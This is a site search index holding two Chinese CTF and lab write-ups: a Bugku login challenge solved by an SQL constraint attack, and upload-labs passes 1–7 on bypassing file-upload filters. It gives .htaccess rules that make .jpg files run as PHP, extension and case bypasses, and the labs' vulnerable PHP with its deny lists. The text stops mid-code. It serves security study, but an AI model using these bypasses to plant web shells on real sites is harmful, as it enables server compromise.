<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>bugku-login1-SKCTF</title>
      <link href="/2019/08/16/bugku-login1-SKCTF/"/>
      <url>/2019/08/16/bugku-login1-SKCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址:"></a>题目地址:</h1><p><a href="http://123.206.31.85:49163/" target="_blank" rel="noopener">http://123.206.31.85:49163/</a></p><a id="more"></a><p>上去就随手注册一个cxk</p><img src="/2019/08/16/bugku-login1-SKCTF/notadmin.png"><p>然后注册一下admin</p><img src="/2019/08/16/bugku-login1-SKCTF/adminexist.png"><p>注册一下AdMin</p><img src="/2019/08/16/bugku-login1-SKCTF/flag.png"><p>回到在平台点开题目看到的hint</p><img src="/2019/08/16/bugku-login1-SKCTF/info.png"><blockquote><p>贴上看到的WP:<br>作者：wuli_decade<br>链接：<a href="https://www.jianshu.com/p/f564ef699b69" target="_blank" rel="noopener">https://www.jianshu.com/p/f564ef699b69</a><br>来源：简书</p></blockquote><p>WP用的方法是在注册时,admin后加N个空格(N&gt;0)</p><p>而我则是大小写绕过了</p><p>因为在处理SQL中的字符串时，字符串末尾的空格字符都会被删除。换句话说，“vampire”与“vampire ”几乎是等效的，这在大多数情况下是正确的，例如WHERE子句中的字符串或INSERT语句中的字符串。究其原因是因为在字符串比较的过程中，内部在比较之前先进行了补充，使其长度一致再进行比较。</p><h1 id="WP中还提到sql约束攻击的条件："><a href="#WP中还提到sql约束攻击的条件：" class="headerlink" title="WP中还提到sql约束攻击的条件："></a>WP中还提到sql约束攻击的条件：</h1><ol><li><p>mysql处于ANSI模式。如果是TRADITIONAL模式或者STRICT_TRANS_TABLES模式会报错data too long for column。</p></li><li><p>服务端没有对用户名长度进行限制。如果服务端限制了用户名长度就自然就不客能导致数据库截断，也就没有利用条件。</p></li><li><p>登陆验证的SQL语句必须是用户名和密码一起验证。如果是验证流程是先根据用户名查找出对应的密码然后再比对密码，当使用vampire为用户名来查询密码的话，数据库此时就会返回两条记录，而一般取第一条即目标用户的记录，那么传输的密码肯定和目标用户密码匹配不上的。</p></li><li><p>验证成功后返回的必须是用户传递进来的用户名，而不是从数据库取出的用户名。因为当我们以用户vampire和密码random_pass登陆时，其实数据库返回的是我们自己的用户信息，而我们的用户名其实是vampire+若干个空格，如果此后的业务逻辑以该用户名为准，那么就不能达到越权的目的了。</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs-master</title>
      <link href="/2019/08/10/upload-labs-master/"/>
      <url>/2019/08/10/upload-labs-master/</url>
      
        <content type="html"><![CDATA[<h1 id="pass01"><a href="#pass01" class="headerlink" title="pass01"></a>pass01</h1><img src="/2019/08/10/upload-labs-master/start.png"><a id="more"></a><p>看到任务之后写了一个简单的php文件上传</p><img src="/2019/08/10/upload-labs-master/failed.png"><h2 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h2><p>记得之前蓝帽的时候李师傅用抓包改后缀的方法可以成功上传,那么现在来试试</p><img src="/2019/08/10/upload-labs-master/jpgtophp.png"><p>forward之后可以成功上传</p><h2 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h2><img src="/2019/08/10/upload-labs-master/allowed.png"><p>既然是白名单限制,那就把php加到白名单里</p><img src="/2019/08/10/upload-labs-master/modified.png"><p>只修改还不行,要把修改后的函数ctrl-v到控制台里,再按enter健</p><h2 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h2><p>可以把上传区这一部分的checkfile函数删除</p><img src="/2019/08/10/upload-labs-master/checkfile.png"><h2 id="法4"><a href="#法4" class="headerlink" title="法4"></a>法4</h2><p>使用Firefox的插件NoScript</p><p>贴一下pass01的源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="keyword">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="pass02"><a href="#pass02" class="headerlink" title="pass02"></a>pass02</h1><h2 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h2><p>依然可以使用上面的法1</p><h2 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h2><p>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现这是可以用contenttype来过滤的</p><p>所以抓包后修改contenttpe即可</p><img src="/2019/08/10/upload-labs-master/contenttype.png"><h1 id="pass03"><a href="#pass03" class="headerlink" title="pass03"></a>pass03</h1><p>这次使用jpg-php的方法不行了</p><img src="/2019/08/10/upload-labs-master/03filter.png"><p>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这是个黑名单过滤</p><p>不能上传.asp | .aspx | .php | .jsp 这4种后缀的文件</p><p>但是可以用扩展名绕过的方法</p><p>把php改为php3/4/5 | pthml即可</p><img src="/2019/08/10/upload-labs-master/extensionbypass.png"><h1 id="pass04"><a href="#pass04" class="headerlink" title="pass04"></a>pass04</h1><p>尝试jpg抓包改php,失败</p><p>php改为php3/4/5 | phtml,失败</p><p>查看源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有一堆黑名单,估计扩展名绕过是不可能的了</p><p>查看DD大佬的博客发现这道题叫<strong>htaccess绕过</strong></p><p>xxx.htaccess文件是文件上传经常用到的一种文件</p><p>上传.htaccess文件,需要：</p><ol><li>mod_rewrite模块开启</li><li>AllowOverride All(httpd.conf文件中修改)</li></ol><h2 id="htaccess的作用"><a href="#htaccess的作用" class="headerlink" title="htaccess的作用"></a>htaccess的作用</h2><p>.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p><h2 id="法1-2"><a href="#法1-2" class="headerlink" title="法1"></a>法1</h2><ul><li>上传.htaccess文件</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch "webshell.jpg"&gt;</span></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure><p>这几行代码的意思是,对webshell.jpg使用php重新解析</p><ul><li>上传webshell.jpg</li></ul><h2 id="法2-2"><a href="#法2-2" class="headerlink" title="法2"></a>法2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure><p>这样就全部文件都使用php重新解析</p><h2 id="法3-1"><a href="#法3-1" class="headerlink" title="法3"></a>法3</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>把所有.jpg文件解析成php文件</p><h1 id="pass05"><a href="#pass05" class="headerlink" title="pass05"></a>pass05</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比一下pass05和pass04的源码,会发现pass05没有转换为小写的函数</p><blockquote><p>$file_ext = strtolower($file_ext); //转换为小写</p></blockquote><p>因此可以用大小写绕过来实现文件上传</p><h1 id="pass06"><a href="#pass06" class="headerlink" title="pass06"></a>pass06</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比源码发现没有去空</p><blockquote><p>$file_ext = trim($file_ext); //首尾去空</p></blockquote><p>抓包在.php后面多加几个空格就完事</p><h1 id="pass07"><a href="#pass07" class="headerlink" title="pass07"></a>pass07</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span 